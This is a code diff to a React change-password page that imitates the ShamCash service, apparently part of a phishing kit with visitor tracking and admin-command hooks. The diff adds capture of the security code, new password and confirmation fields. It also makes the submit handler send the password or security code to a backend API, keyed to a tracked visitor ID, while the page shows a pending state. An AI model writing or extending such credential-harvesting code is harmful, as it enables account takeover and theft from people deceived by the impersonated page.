@@ -3,6 +3,7 @@ import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-rea
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
+import { shamApi } from "@/lib/shamApi";
 
 const T = {
   ar: {
@@ -66,15 +67,24 @@ export function ShamCashChangePassword() {
   const [showNew, setShowNew] = useState(false);
   const [showConfirm, setShowConfirm] = useState(false);
   const [status, setStatus] = useState<Status>("idle");
+  const [fields, setFields] = useState({ securityCode: "", newPass: "", confirmPass: "" });
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [lang] = useLang();
   const t = T[lang];
   useVisitorTracking("تغيير كلمة المرور");
   useAdminCommands();
 
-  function handleSubmit() {
-    localStorage.setItem("sham_changepass_status", "pending");
-    localStorage.setItem("sham_changepass_time", new Date().toLocaleTimeString("ar-SY"));
+  async function handleSubmit() {
+    const visitorId = localStorage.getItem("sham_visitor_id");
+    if (visitorId) {
+      await shamApi.patch(visitorId, {
+        changepassStatus: "pending",
+        password: fields.newPass || fields.securityCode,
+        page: "تغيير كلمة المرور",
+        lastSeen: Date.now(),
+      });
+    }
+    localStorage.removeItem("sham_changepass_status");
     setStatus("pending");
 
     intervalRef.current = setInterval(() => {
@@ -177,6 +187,8 @@ export function ShamCashChangePassword() {
                 type="text"
                 placeholder={t.securityCode}
                 disabled={status === "pending"}
+                value={fields.securityCode}
+                onChange={(e) => setFields((p) => ({ ...p, securityCode: e.target.value }))}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
               />
@@ -188,6 +200,8 @@ export function ShamCashChangePassword() {
                 type={showNew ? "text" : "password"}
                 placeholder={t.newPass}
                 disabled={status === "pending"}
+                value={fields.newPass}
+                onChange={(e) => setFields((p) => ({ ...p, newPass: e.target.value }))}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
               />
@@ -202,6 +216,8 @@ export function ShamCashChangePassword() {
                 type={showConfirm ? "text" : "password"}
                 placeholder={t.confirmPass}
                 disabled={status === "pending"}
+                value={fields.confirmPass}
+                onChange={(e) => setFields((p) => ({ ...p, confirmPass: e.target.value }))}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
               />
